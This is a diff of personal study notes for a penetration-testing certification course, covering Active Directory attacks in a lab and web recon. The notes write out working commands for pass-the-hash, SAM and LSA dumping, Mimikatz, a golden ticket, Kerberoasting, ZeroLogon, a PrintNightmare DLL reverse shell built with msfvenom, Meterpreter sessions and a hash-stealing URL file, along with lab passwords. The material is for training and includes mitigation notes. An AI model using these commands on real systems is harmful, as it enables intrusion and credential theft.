@@ -1,5 +1,4 @@
 
-
 ## Before We Begin
 
 ### PNPT Certification Path Progression
@@ -3027,6 +3026,1015 @@ fcastle::TREE:51934501eb00515e:9ABE5E3F30739166896A5BEEA3D0621F:0101000000000000
 > [!todo] 
 > Download SharpHound.ps1 on Windows Target:
 > https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
+> `powershell -ep bypass`
+> `. .\SharpHound.ps1`
+> `Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip`
+> - Drag and Drop ZIP file from Windows VM to Host
+> - Move ZIP file to Kali VM
+
+### Enumerating Domain Data with Bloodhound
+
+![[Pasted image 20230322192720.png]]
+
+![[Pasted image 20230322193027.png]]
+![[Pasted image 20230322193208.png]]
+
+![[Pasted image 20230322193244.png]]
+
+![[Pasted image 20230322193359.png]]
+
+> [!todo] 
+> Click on Box, you will see where machine where Admin is logged in. This machine we will try to compromise later.
+
+![[Pasted image 20230322194114.png]]
+![[Pasted image 20230322194255.png]]
+
+![[Pasted image 20230322194358.png]]
+
+> [!info] 
+> We can see here that SQL Server is member of Domain Admins
 > 
 
+![[Pasted image 20230322194617.png]]
+
+## Attacking Active Directory: Post-Compromise Attacks
+
+### Introduction
+
+> [!info] 
+> All this techniques in this chapter requires kind of credential (hash, password, username, etc.)
+
+
+### Pass the Hash / Password Overview
+
+![[Pasted image 20230323084646.png]]
+
+![[Pasted image 20230323084836.png]]
+
+![[Pasted image 20230323084943.png]]
+
+![[Pasted image 20230323085018.png]]
+
+
+### Installing crackmapexec
+
+> [!todo] 
+>  `sudo apt-get install crackmapexec`
+>  `crackmapexec --help`
+
+![[Pasted image 20230323085451.png]]
+
+### Pass the Password Attacks
+
+> [!todo] 
+> `crackmapexec smb 192.168.203.0/24 -u fcastle -d MARVEL.local -p Password1` 
+
+![[Pasted image 20230323085910.png]]
+
+> [!todo] 
+> Dump SAM file:
+> `crackmapexec smb 192.168.203.0/24 -u fcastle -d MARVEL.local -p Password1 --sam` 
+
+![[Pasted image 20230323090210.png]]
+
+> [!todo] 
+> Get Shell on Windows VM:
+> `impacket-psexec marvel/fcastle:Password1@192.168.203.137` 
+
+![[Pasted image 20230323090640.png]]
+
+### Dumping Hashes with secretsdump.py
+
+> [!todo] 
+>  `impacket-secretsdump marvel/fcastle:Password1@192.168.203.137`
+
+![[Pasted image 20230323091207.png]]
+
+> [!info] 
+> If you dump it from different machines, you can check if hashes are same (password reuse)
+> 
+
+![[Pasted image 20230323091417.png]]
+
+### Cracking NTLM Hashes with Hashcat
+
+> [!attention] 
+> NTLM can be passed around, NTLM 2 hashes can't 
+> 
+
+> [!todo] 
+> On Host OS, not VM, otherwise it's slow:
+> `hashcat.exe -m 1000 hashes.txt rockyou.txt -O` 
+
+![[Pasted image 20230323092239.png]]
+
+### Pass the Hash Attacks
+
+> [!todo] 
+> `crackmapexec smb 192.168.203.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b --local-auth` 
+
+![[Pasted image 20230323101025.png]]
+
+> [!todo] 
+>  Try to authentificate with hash:
+>  `impacket-psexec "frank castle":@192.168.203.137 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b`
+
+![[Pasted image 20230323101621.png]]
+
+### Pass Attack Mitigations
+
+![[Pasted image 20230323101737.png]]
+
+### Token Impersonation Overview
+
+![[Pasted image 20230323102101.png]]
+
+![[Pasted image 20230323102242.png]]
+
+![[Pasted image 20230323102329.png]]
+
+![[Pasted image 20230323102419.png]]
+
+![[Pasted image 20230323102442.png]]
+
+![[Pasted image 20230323102506.png]]
+
+![[Pasted image 20230323102539.png]]
+
+![[Pasted image 20230323102610.png]]
+
+![[Pasted image 20230323102637.png]]
+
+### Token Impersonation with Incognito
+
+> [!todo] 
+> Start Metasploit:
+> `msfconsole`
+> `use exploit/windows/smb/psexec`
+> `options`
+> `set rhosts 192.168.203.137`
+> `set smbdomain marvel.local`
+> `set smbpass Password1`
+> `set smbuser fcastle`
+
+![[Pasted image 20230323104049.png]]
+
+> [!todo] 
+> `show targets`
+> `set target 2`
+> 
+
+![[Pasted image 20230323104155.png]]
+
+> [!todo] 
+> `set payload windows/x64/meterpreter/reverse_tcp` 
+> `set lhost eth0`
+
+![[Pasted image 20230323104433.png]]
+
+> [!todo] 
+> `run` 
+
+![[Pasted image 20230323104546.png]]
+
+> [!todo] 
+> Now we have a meterpreter shell. Now we can run all fun stuff:
+> `hashdump`
+> `getuid`
+> `sysinfo`
+
+![[Pasted image 20230323104725.png]]
+
+![[Pasted image 20230323104856.png]]
+
+> [!todo] 
+> `load incognito` 
+> `help`
+
+![[Pasted image 20230323105033.png]]
+
+> [!todo] 
+> `list_tokens -u`
+
+![[Pasted image 20230323105502.png]]
+
+> [!todo] 
+> `impersonate_token marvel\\administrator` 
+> `shell`
+> `whoami`
+
+![[Pasted image 20230323165805.png]]
+
+![[Pasted image 20230323165847.png]]
+
+> [!todo] 
+> `Ctrl C` to leave Windows shell
+> `rev2shell` to go back as user we got in to machine
+> How we can use again for example `hashdump`
+
+![[Pasted image 20230323170146.png]]
+
+> [!todo] 
+> Login to our Windows 10 VM as `fcastle` 
+
+![[Pasted image 20230323170307.png]]
+
+> [!info] 
+> Now we can see that `fcastle` user is logged in:
+> `list_tokens -u`
+
+![[Pasted image 20230323170450.png]]
+
+> [!hint] 
+> This token is valid until reboot 
+
+> [!todo] 
+>  `impersonate_token marvel\\fcastle`
+>  `shell`
+>  `whoami`
+
+![[Pasted image 20230323170752.png]]
+
+### Token Impersonation Mitigation
+
+![[Pasted image 20230323170913.png]]
+
+> [!important] 
+>  - Domain Administrator should only login to machines which are Domain Controllers
+>  - If Domain Administrator login to Computer or Server and this Machine got compromised, the maybe can impersonate his token
+>  - Administrator (for example `bob-admin`) should have additional account for daily use (`bob`) without Domain Admin privilage.
+
+### Kerberoasting Overview
+
+![[Pasted image 20230323171606.png]]
+
+![[Pasted image 20230323173026.png]]
+
+![[Pasted image 20230323173120.png]]
+
+### Kerberoasting Walkthrough
+
+> [!todo] 
+>  `impacket-GetUserSPNs marvel.local/fcastle:Password1 -dc-ip 192.168.203.136 -request`
+
+![[Pasted image 20230323173533.png]]
+
+> [!info] 
+> Now try to crack hash:
+> `hashcat --help | grep Kerberos`
+
+![[Pasted image 20230323173856.png]]
+
+> [!todo] 
+> Crack hash:
+> `hashcat.exe -m 13100 hashes.txt rockyou.txt -O` 
+
+![[Pasted image 20230323174125.png]]
+
+> [!hint] 
+> Now we cracked Password of 14 characters which has Domain Admin access
+> **Don't use weak passwords!**
+
+### Kerberoasting Mitigation
+
+![[Pasted image 20230323174426.png]]
+
+> [!tip] 
+> - Use strong password for service accounts (30 characters or more)
+> - Don't make your users Domain Administrator
+> - Don't make your service accounts Domain Administrator
+
+
+### GPP / cPassword Attacks Overview
+
+> [!note] 
+>  Resources for this video:
+>  Group Policy Pwnage: [https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)
+>  - Group Policy Preferences (GPP): These policies allowed administrators to set local accounts, embed credentials for the purposes of mapping drives, or perform other tasks that may otherwise require an embedded password in a script.
+>  - Storage mechanism for the credentials was flawed and allowed attackers to trivially decrypt the plaintext credentials.
+>  - While addressed in MS14-025, this patch only prevents new policies from being created, and any legacy GPPs containing credentials must be found and removed.
+
+![[Pasted image 20230325122423.png]]
+
+> [!tip] 
+> There is module in Metasploit to scan for it:
+> `smb_enum_gpp`
+> 
+
+
+### Abusing GPP: Part 1
+
+> [!info] 
+> Start VM on HackTheBox (VIP Account needed for this Machine):
+> https://app.hackthebox.com/machines/Active
+> 
+
+> [!todo] 
+> Start VM, connect  via VPN:
+> `sudo openvpn your-profile.ovpn`
+
+
+> [!todo] 
+> nmap Scan:
+> `nmap -T5 10.10.10.100`
+> 
+
+![[Pasted image 20230329152622.png]]
+
+> [!todo] 
+> Check Anonymous Loging via SMB:
+>  `smbclient -L \\\\10.10.10.100\\`
+
+![[Pasted image 20230329152803.png]]
+
+> [!todo] 
+> We have access to `Replication` share as anonymous:
+>  `smbclient \\\\10.10.10.100\\Replication`
+
+![[Pasted image 20230329153002.png]]
+
+> [!todo] 
+> Run in `smb` shell:
+> `prompt off` 
+> `recurse on`
+> `ls`
+
+![[Pasted image 20230329153447.png]]
+
+![[Pasted image 20230329153611.png]]
+
+> [!info] 
+> `Groups.xml` is file we're intressted in
+> 
+
+> [!todo] 
+> `mget *` 
+
+![[Pasted image 20230329153741.png]]
+
+![[Pasted image 20230329153932.png]]
+
+![[Pasted image 20230329154105.png]]
+
+
+> [!todo] 
+> Run in Kali Terminal:
+> `gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ` 
+
+![[Pasted image 20230329154240.png]]
+
+> [!done] 
+> Now we have username and password:
+> Username: `active.htb\SVC_TGS`
+> Password: `GPPstillStandingStrong2k18`
+
+
+### Abusing GPP: Part 2
+
+#### Try my own way to Pwn DC
+
+> [!note] 
+> Try to login and try to escalate privilage by myself:
+>  Use Kerberoasting Attack to get Hash of Administrator and crack it:
+
+![[Pasted image 20230329164707.png]]
+
+![[Pasted image 20230329164810.png]]
+
+> [!success] 
+> Username: Administrator
+> Password: Ticketmaster1968
+> 
+
+
+> [!todo] 
+> `crackmapexec smb 10.10.10.100  -u "Administrator" -p Ticketmaster1968` 
+
+![[Pasted image 20230329165407.png]]
+
+> [!todo] 
+> `msfconsole`
+> `use exploit/windows/smb/psexec`
+
+![[Pasted image 20230329165843.png]]
+
+![[Pasted image 20230329170029.png]]
+
+![[Pasted image 20230329170636.png]]
+
+
+### URL File Attacks
+
+> [!info] 
+>  Chapter Info:
+>  Active Directory Attacks - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share)
+
+``` 
+[InternetShortcut]
+URL=blah
+WorkingDirectory=blah
+IconFile=\\x.x.x.x\%USERNAME%.icon
+IconIndex=1
+```
+
+> [!todo] 
+> Put IP of your Kali (Attacker) Machine.
+> Safe this content to File Share and use filename like this:  `"@test.url"`  (Including quotes)
+
+![[Pasted image 20230330161351.png]]
+
+> [!todo] 
+> On Kali VM:
+> `sudo responder -I eth0 -v`
+> 
+
+> [!info] 
+> When no someone go to this share, automatically this request is send out to our Kali
+> 
+
+![[Pasted image 20230330161612.png]]
+
+> [!info] 
+> You can use this NTLMv2 Hash to relay to target you like to access
+> 
+
+> [!warning] 
+> As a reminder: NTLMv2 can't be bruteforced
+> 
+
+
+### PrintNightmare (CVE-2021-1675) Walkthrough
+
+
+> [!attention] 
+> Looks like this attack is also working for Windows 10 Standalone Machines (No Domain Controll member)
+
+> [!info] 
+> Lession Info:
+>  cube0x0 RCE - [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)
+>  calebstewart LPE - [https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)
+
+> [!todo] 
+> See if DC is vulnerable for PrintNightmare:
+> `impacket-rpcdump @192.168.203.136 | egrep 'MS-RPRN|MS-PAR' ` 
+
+![[Pasted image 20230330162401.png]]
+
+> [!todo] 
+> Download  PrintNightmare from Github (cube0x0 RCE) on your Kali
+
+> [!todo] 
+> Create Malicious DLL Reverse Shell :
+> `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.203.135 LPORT=5555 -f dll > shell.dll` 
+
+> [!todo] 
+> Start Listener:
+> `msfconsole` 
+> `use multi/handler`
+> `set payload windows/x64/meterpreter/reverse_tcp`
+> `set lport 5555`
+> `set lhost eth0`
+> `run`
+
+![[Pasted image 20230330163702.png]]
+
+> [!todo] 
+> At folder where DLL is which we created, run:
+> `impacket-smbserver share ./ 'pwd' -smb2support` 
+
+> [!todo] 
+> Run PrinterNightmare.py on Kali:
+>  `./PrintNightmare.py marvel.local/fcastle:Password1@192.168.203.136 '\\192.168.203.135\share\shell.dll'`
+
+![[Pasted image 20230330165432.png]]
+
+> [!attention] 
+> If Server Antivirus detect malicious `dll`, you have to obfuscate dll.
+> 
+
+
+
+
+### Mimikatz Overview
+
+> [!info] 
+> Resources for this video:
+> Mimikatz: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) 
+
+![[Pasted image 20230331150643.png]]
+
+> [!caution] 
+> It could be that in newer updates of Windows Mimikatz isn't working anymore. It's a mouse and cat game...
+> 
+
+
+
+### Credential Dumping with Mimikatz
+
+> [!tip] 
+>  Mimikatz Wiki is a great place to find out detailed informations:
+>  https://github.com/gentilkiwi/mimikatz/wiki
+
+> [!todo] 
+>  - Go im `cmd` to Mimikatz folder
+>  - Run `>mimikatz.exe`
+>  - `privilege::debug`
+>  - `sekurlsa::logonpasswords`
+
+![[Pasted image 20230331153245.png]]
+
+![[Pasted image 20230331153630.png]]
+
+> [!tip] 
+> We can try to pass around NTLM hash to get access somewhere 
+
+![[Pasted image 20230331153807.png]]
+
+> [!info] 
+> - `wdigest` was feature which stored password in cleartext. It's deactivated since around windows 10 or before, by default.  But feature still exists.
+> - `wdigest` can be enabled in registry
+
+> [!todo] 
+> Dump SAM:
+> `lsadump::sam` 
+> or if that failed
+> `lsadump::sam /patch`
+> otherwise use other tools like metasploit for that
+
+> [!todo] 
+> LSA - Local Security Authority
+> ` lsadump::lsa /patch` 
+
+![[Pasted image 20230331154413.png]]
+
+> [!info] 
+> Here we get usernames and `NTLM` hashes. We can try to crack them with `hashcat`.
+> 
+
+> [!tip] 
+> We can use cracked passwords to put in our report and give recomendation to our client about if his password policy is good or not.  
+
+
+### Golden Ticket Attacks
+
+> [!info] 
+> If we have username and password we can use `Ticket-Granting Ticket (TGT)` on Domain Controller.  
+
+> [!todo] 
+>  - Go im `cmd` to Mimikatz folder
+>  - Run `>mimikatz.exe`
+>  -  `privilege::debug`
+>  - `lsadump::lsa /inject /name:krbtgt`
+
+![[Pasted image 20230331173219.png]]
+
+![[Pasted image 20230331173402.png]]
+
+> [!todo] 
+>  In Mimikatz:
+>  `kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-2219376320-3670275496-2911372019 /krbtgt:fa02fc5707d4280acb4ddcec1d381a66 /id:500 /ptt`
+
+> [!question] 
+> `id` 500 is ID of Administrator 
+> `ptt` stands for pass the ticket
+
+![[Pasted image 20230331173831.png]]
+
+> [!todo] 
+>  `misc::cmd` - We have now session we created in `cmd` promt
+>  `dir \\THEPUNISHER\c$`
+
+![[Pasted image 20230331174118.png]]
+
+> [!todo] 
+> Download psexec.exe from Microsoft: https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
+> run in this `cmd` window: `>PsExec.exe \\THEPUNISHER cmd.exe` and you will have shell on that machine
+> 
+
+![[Pasted image 20230401140245.png]]
+
+
+### Conclusion and Additional Resources
+
+> [!note] 
+>  Resources for this video:
+Active Directory Security Blog: https://adsecurity.org/
+Harmj0y Blog: http://blog.harmj0y.net/
+Pentester Academy Active Directory: https://www.pentesteracademy.com/activedirectorylab
+Pentester Academy Red Team Labs: https://www.pentesteracademy.com/redteamlab
+eLS PTX: https://elearnsecurity.com/product/ecptx-certification/
+
+
+## Additional Active Directory Attacks
+
+### Abusing ZeroLogon
+
+> [!note] 
+>  Resources for this video:
+What is ZeroLogon? - https://www.trendmicro.com/en_us/what-is/zerologon.html
+dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472
+SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472
+
+> [!warning] 
+> This set Domain Controller Admin to zero. So this is maybe not recomended on pentest or at least make sure you restore password after.
+> 
+
+> [!todo] 
+> Clone  [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472) and also [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
+
+> [!todo] 
+> Test if DC is vulnerable for ZeroLogon:
+>  Go to cloned folder of `SecuraBV ZeroLogon Checker`
+>  `python3 zerologon_tester.py HYDRA-DC 192.168.203.136`
+
+![[Pasted image 20230401142404.png]]
+
+> [!warning] 
+> Better not to run acctual attack after you do that check. Just call customer and tell them to patch it.
+> 
+
+> [!todo] 
+> Run Attack in **Lab** environment:
+>  Go to cloned folder of `dirkjanm CVE-2020-1472`
+>  `python3 cve-2020-1472-exploit.py HYDRA-DC 192.168.203.136`
+
+![[Pasted image 20230401142810.png]]
+
+> [!todo] 
+> `impacket-secretsdump -just-dc MARVEL/HYDRA-DC\$@192.168.203.136`
+
+> [!done] 
+> When you get promt to put `Password`, only press enter! 
+
+![[Pasted image 20230401143024.png]]
+
+> [!todo] 
+> How to restore password:
+>  `impacket-secretsdump administrator@192.168.203.136 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33` - Use hash of Administrator
+
+![[Pasted image 20230401143602.png]]
+
+> [!info] 
+> This info after `plain_password_hex` we use to restore password of DC:
+> `python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip 192.168.203.136 -hexpass ee174e678e6460b16c3b465d04a601c803d0aca0d5c6a3aa70b57e078ec6a428ad8d0c3f10a2335e7837e3f1a6804231d60b02c1f9b6fcb0a698c4bb9ad954d18f0839b9c20a5d300249034bff0966f934b090022a4317a2f800ef7b4cb2d1bb2da0ac810a6e773181c99ba730164542f9664f8646627d44ce56b150d05970b6221e55a10da1b3612311e97a2047f74eb6a8ec94f8824c05f9461ba2065dceb02c9cfba7afd3c2f9678d5afdf0a0640f8b46d43cecb43a367b5f5afdbf139e3f8c4d347ea61b2584f6c2857bb043f6698b33905b26a036150fae41c96293a0f13cf11e3e6253d25a13851a5376804e90
+`
+
+![[Pasted image 20230401143709.png]]
+
+![[Pasted image 20230401143929.png]]
+
+
+## Post Exploitation
+
+### File Transfers Review
+
+![[Pasted image 20230401144820.png]]
+
+### Maintaining Access Overview
+
+> [!warning] 
+> Normally you don't persistence on a pentest. Only maybe `Add a User` for time of pentest.  
+
+![[Pasted image 20230401145120.png]]
+
+> [!info] 
+> Commands above are from metasploit
+> 
+
+
+### Pivoting Lab Setup
+
+> [!todo] 
+> - Shutdown both Windows 10 VMs
+
+![[Pasted image 20230401151318.png]]
+
+> [!todo] 
+> - Add `VMnet7` as additional Network Interface to first Windows VM 
+> - Change Network Interface Windows VM No. 2 to `VMnet7`
+> - Boot up VM's
+> - Check IP configuration of both Windows VMs:
+
+![[Pasted image 20230401151809.png]]
+
+![[Pasted image 20230401151831.png]]
+
+### Pivoting Walkthrough
+
+> [!todo] 
+> Start Metasploit on Kali VM:
+> `msfconsole`
+>  `use exploit/windows/smb/psexec`
+>  `set rhost 192.168.203.137`
+>  `set smbdomain marvel.local`
+>  `set smbpass Password1`
+>  `set smbuser fcastle`
+>  `set payload windows/x64/meterpreter/reverse_tcp`
+>  `set lhost eth0`
+>  `set target 2`
+
+![[Pasted image 20230401152444.png]]
+
+![[Pasted image 20230401152609.png]]
+
+> [!todo] 
+> `shell`
+> `route print`
+> `ipconfig`
+> `arp -a`
+
+![[Pasted image 20230401152727.png]]
+
+![[Pasted image 20230401152833.png]]
+
+> [!todo] 
+> `Ctrl C` to leave shell and go back `meterpreter` shell 
+
+> [!todo] 
+> In meterpreter:
+> `run autoroute -s 10.10.10.0/24` 
+
+![[Pasted image 20230401153100.png]]
+
+> [!todo] 
+>  `run autoroute -p`
+
+![[Pasted image 20230401153203.png]]
+
+> [!todo] 
+> `background` 
+
+![[Pasted image 20230401153247.png]]
+
+> [!todo] 
+>  `search portscan`
+>  `use auxiliary/scanner/portscan/tcp`
+>  `options`
+>  `set rhost 10.10.10.128`
+>  `set ports 445`
+
+![[Pasted image 20230401153549.png]]
+
+
+### Cleaning Up
+
+![[Pasted image 20230401153739.png]]
+
+
+## Web Application Enumeration, Revisited
+
+### Installing Go
+
+> [!todo] 
+> Use `pimpmykali` script:
+>  https://github.com/Dewalt-arch/pimpmykali
+>  `sudo ./pimpmykali.sh`
+>  3 - Fix Golang  `3`
+
+
+### Finding Subdomains with Assetfinder
+
+> [!todo] 
+> Install `assetfinder` https://github.com/tomnomnom/assetfinder
+> `apt-get install assetfinder`
+
+> [!todo] 
+>  `assetfinder tesla.com`
+>  `assetfinder tesla.com >> tesla-subdomains.txt` -> To safe to text file
+>  `assetfinder --subs-only tesla.com`
+
+![[Pasted image 20230402102807.png]]
+
+### Finding Subdomains with Amass
+
+> [!todo] 
+> Install Amass by OWASP:
+>  https://github.com/owasp-amass/amass
+>`sudo apt-get update`
+>`sudo apt-get install amass`
+>`amass enum -d tesla.com`
+
+
+### Finding Alive Domains with Httprobe
+
+> [!info] 
+> This tool check if host alive or not 
+
+> [!todo] 
+> Install Httprobe:
+> https://github.com/tomnomnom/httprobe
+> `sudo apt-get install httprobe` 
+> `cat tesla.com/recon/final.txt | httprobe`
+
+
+### Screenshotting Websites with GoWitness
+
+> [!todo] 
+> Install GoWitness:
+> https://github.com/sensepost/gowitness
+> `go install github.com/sensepost/gowitness@latest` 
+> `gowitness single https://tesla.com`
+
+
+### Automating the Enumeration Process
+
+> [!note] 
+> Resources for this video:
+> sumrecon: [https://github.com/thatonetester/sumrecon](https://github.com/thatonetester/sumrecon)
+> TCM's modified script - [https://pastebin.com/MhE6zXVt](https://pastebin.com/MhE6zXVt) 
+
+> [!todo] 
+> Install additional tools
+> `sudo apt-get update`
+>  `sudo apt-get install subjack`
+>  `go install -v github.com/tomnomnom/waybackurls@latest`
+>  
+
+``` 
+#!/bin/bash
+
+######
+# Source script by TCM Security: https://pastebin.com/raw/MhE6zXVt
+# Modify by me
+######
+
+# Go User's home folder
+cd 
+
+url=$1
+
+if [ ! -d "$url" ];then
+	mkdir $url
+fi
+if [ ! -d "$url/recon" ];then
+	mkdir $url/recon
+fi
+#    if [ ! -d '$url/recon/eyewitness' ];then
+#        mkdir $url/recon/eyewitness
+#    fi
+if [ ! -d "$url/recon/scans" ];then
+	mkdir $url/recon/scans
+fi
+if [ ! -d "$url/recon/httprobe" ];then
+	mkdir $url/recon/httprobe
+fi
+if [ ! -d "$url/recon/potential_takeovers" ];then
+	mkdir $url/recon/potential_takeovers
+fi
+if [ ! -d "$url/recon/wayback" ];then
+	mkdir $url/recon/wayback
+fi
+if [ ! -d "$url/recon/wayback/params" ];then
+	mkdir $url/recon/wayback/params
+fi
+if [ ! -d "$url/recon/wayback/extensions" ];then
+	mkdir $url/recon/wayback/extensions
+fi
+if [ ! -f "$url/recon/httprobe/alive.txt" ];then
+	touch $url/recon/httprobe/alive.txt
+fi
+if [ ! -f "$url/recon/final.txt" ];then
+	touch $url/recon/final.txt
+fi
+
+echo "[+] Harvesting subdomains with assetfinder..."
+assetfinder $url >> $url/recon/assets.txt
+cat $url/recon/assets.txt | grep $1 >> $url/recon/final.txt
+rm $url/recon/assets.txt
+
+#echo "[+] Double checking for subdomains with amass..."
+#amass enum -d $url >> $url/recon/f.txt
+#sort -u $url/recon/f.txt >> $url/recon/final.txt
+#rm $url/recon/f.txt
+
+echo "[+] Probing for alive domains..."
+cat $url/recon/final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> $url/recon/httprobe/a.txt
+sort -u $url/recon/httprobe/a.txt > $url/recon/httprobe/alive.txt
+rm $url/recon/httprobe/a.txt
+
+echo "[+] Checking for possible subdomain takeover..."
+
+if [ ! -f "$url/recon/potential_takeovers/potential_takeovers.txt" ];then
+	touch $url/recon/potential_takeovers/potential_takeovers.txt
+fi
+
+subjack -w $url/recon/final.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 -o $url/recon/potential_takeovers/potential_takeovers.txt
+
+echo "[+] Scanning for open ports..."
+nmap -iL $url/recon/httprobe/alive.txt -T4 -oA $url/recon/scans/scanned.txt
+
+echo "[+] Scraping wayback data..."
+cat $url/recon/final.txt | waybackurls >> $url/recon/wayback/wayback_output.txt
+sort -u $url/recon/wayback/wayback_output.txt
+
+echo "[+] Pulling and compiling all possible params found in wayback data..."
+cat $url/recon/wayback/wayback_output.txt | grep '?*=' | cut -d '=' -f 1 | sort -u >> $url/recon/wayback/params/wayback_params.txt
+for line in $(cat $url/recon/wayback/params/wayback_params.txt);do echo $line'=';done
+
+echo "[+] Pulling and compiling js/php/aspx/jsp/json files from wayback output..."
+for line in $(cat $url/recon/wayback/wayback_output.txt);do
+	ext="${line##*.}"
+	if [[ "$ext" == "js" ]]; then
+		echo $line >> $url/recon/wayback/extensions/js1.txt
+		sort -u $url/recon/wayback/extensions/js1.txt >> $url/recon/wayback/extensions/js.txt
+	fi
+	if [[ "$ext" == "html" ]];then
+		echo $line >> $url/recon/wayback/extensions/jsp1.txt
+		sort -u $url/recon/wayback/extensions/jsp1.txt >> $url/recon/wayback/extensions/jsp.txt
+	fi
+	if [[ "$ext" == "json" ]];then
+		echo $line >> $url/recon/wayback/extensions/json1.txt
+		sort -u $url/recon/wayback/extensions/json1.txt >> $url/recon/wayback/extensions/json.txt
+	fi
+	if [[ "$ext" == "php" ]];then
+		echo $line >> $url/recon/wayback/extensions/php1.txt
+		sort -u $url/recon/wayback/extensions/php1.txt >> $url/recon/wayback/extensions/php.txt
+	fi
+	if [[ "$ext" == "aspx" ]];then
+		echo $line >> $url/recon/wayback/extensions/aspx1.txt
+		sort -u $url/recon/wayback/extensions/aspx1.txt >> $url/recon/wayback/extensions/aspx.txt
+	fi
+done
+
+rm $url/recon/wayback/extensions/js1.txt
+rm $url/recon/wayback/extensions/jsp1.txt
+rm $url/recon/wayback/extensions/json1.txt
+rm $url/recon/wayback/extensions/php1.txt
+rm $url/recon/wayback/extensions/aspx1.txt
+
+echo "[+] Running GoWitness against all compiled domains..."
+gowitness file $url/recon/httprobe/alive.txt -d $url/recon/gowitness
+```
+
+
+### Additional Resources
+
+> [!note] 
+> The Bug Hunter's Methodology - [https://www.youtube.com/watch?v=uKWu6yhnhbQ](https://www.youtube.com/watch?v=uKWu6yhnhbQ)
+> Nahamsec Recon Playlist - [https://www.youtube.com/watch?v=MIujSpuDtFY&list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA](https://www.youtube.com/watch?v=MIujSpuDtFY&list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA) 
+
+
+## Testing the Top 10 Web Application Vulnerabilities
+
+
+### The OWASP Top 10 and OWASP Testing Checklist
+
+> [!note] 
+> Resources for this video:
+OWASP Top 10: https://owasp.org/www-pdf-archive/OWASP_Top_10-2017_%28en%29.pdf.pdf
+OWASP Testing Checklist: https://github.com/tanprathan/OWASP-Testing-Checklist
+OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf 
+
+![Mapping](https://owasp.org/Top10/assets/mapping.png)
+
+![[Pasted image 20230402143714.png]]
+
+![[Pasted image 20230402144001.png]]
+
+
+### Installing OWASP Juice Shop
+
+> [!note] 
+> Resources for this video:
+Installing Docker on Kali: https://medium.com/@airman604/installing-docker-in-kali-linux-2017-1-fbaa4d1447fe
+OWASP Juice Shop: https://github.com/bkimminich/juice-shop
+
+> [!todo] 
+> Install Docker on Kali:
+>  https://airman604.medium.com/installing-docker-in-kali-linux-2017-1-fbaa4d1447fe
+
+> [!caution] 
+>  Reboot Machine after install
+
+> [!todo] 
+> Install OWASP Juice Shop:
+> https://github.com/juice-shop/juice-shop
+> `docker pull bkimminich/juice-shop`
+> `docker run --rm -p 3000:3000 bkimminich/juice-shop`
+> Browse to [http://localhost:3000](http://localhost:3000)
+
+
+### Installing Foxy Proxy
+
+> [!todo] 
+> Install FoxyProxy in your Browser for fast Proxy switching:
+> https://addons.mozilla.org/de/firefox/addon/foxyproxy-standard/
+> 
+
+
+### Exploring Burp Suite
+
+![[Pasted image 20230402153540.png]]
+
+
+### Introducing the Score Board
+
+> [!todo] 
+>  Solve first challange and open score board ;-)
+>  http://localhost:3000/#/score-board
+>
+
+![[Pasted image 20230402154905.png]]
+
+### SQL Injection Attacks Overview
 
